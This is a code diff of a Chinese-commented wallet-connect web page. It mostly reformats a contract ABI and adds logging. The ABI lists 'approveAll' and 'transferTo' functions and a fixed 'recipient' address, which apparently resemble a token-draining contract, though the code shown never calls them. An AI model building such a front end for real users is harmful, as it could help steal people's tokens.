@@ -1,56 +1,56 @@
-const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 替换为你的合约地址
+const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 合约地址
 const abi = [
-	{
-		"inputs": [],
-		"name": "approveAll",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "transferTo",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "_tokenAddress",
-				"type": "address"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"inputs": [],
-		"name": "recipient",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "token",
-		"outputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
+    {
+        "inputs": [],
+        "name": "approveAll",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "transferTo",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "_tokenAddress",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "inputs": [],
+        "name": "recipient",
+        "outputs": [
+            {
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "token",
+        "outputs": [
+            {
+                "internalType": "contract IERC20",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    }
 ];
 
 let provider;
@@ -59,21 +59,24 @@ let contract;
 
 document.getElementById('connectWallet').onclick = async () => {
     try {
-        // 检查浏览器是否支持 MetaMask (window.ethereum)
-        if (window.ethereum) {
+        if (typeof window.ethereum !== 'undefined') {
+            console.log('MetaMask 已检测到');
             provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []); // 请求连接钱包
+
+            // 请求用户连接钱包
+            await provider.send("eth_requestAccounts", []);
+
             signer = provider.getSigner();
             const account = await signer.getAddress();
             
             // 显示连接成功后的地址
             document.getElementById('walletAddress').textContent = `已连接: ${account}`;
-            
-            // 与智能合约实例化
             contract = new ethers.Contract(contractAddress, abi, signer);
+
             console.log("钱包已连接，地址:", account);
         } else {
-            alert("请安装MetaMask!");
+            alert("请安装 MetaMask!");
+            console.error('MetaMask 未检测到');
         }
     } catch (error) {
         console.error("连接钱包时出错:", error);
